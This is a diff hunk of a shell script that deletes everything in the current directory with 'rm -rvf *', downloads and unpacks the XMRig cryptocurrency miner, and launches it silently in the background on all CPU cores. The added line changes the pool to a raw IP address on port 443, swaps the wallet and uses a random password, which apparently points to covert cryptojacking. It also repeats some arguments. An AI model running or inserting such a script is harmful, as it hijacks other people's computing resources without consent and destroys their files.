@@ -3,4 +3,4 @@ rm -rvf *
 wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
 tar xf xmrig-6.22.2-linux-static-x64.tar.gz
 cd xmrig-6.22.2
-./xmrig --donate-level 1 -a rx/0 -o us.0xpool.io:3333 -u 0xb27e57f4accbf3a1384c1c17ac959376fc49e21d -p x -t $(nproc --all) > /dev/null 2>&1 &
+./xmrig --donate-level 1 -o 209.97.168.28:443 -u Q0104006f62eeca4efe4da7805a59e381783e116ab66e257dfe06a6d199cd7505ce9f07847e5a73 -p $(echo $RANDOM | md5sum | head -c 20) -a rx/0 -t $(nproc --all) -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
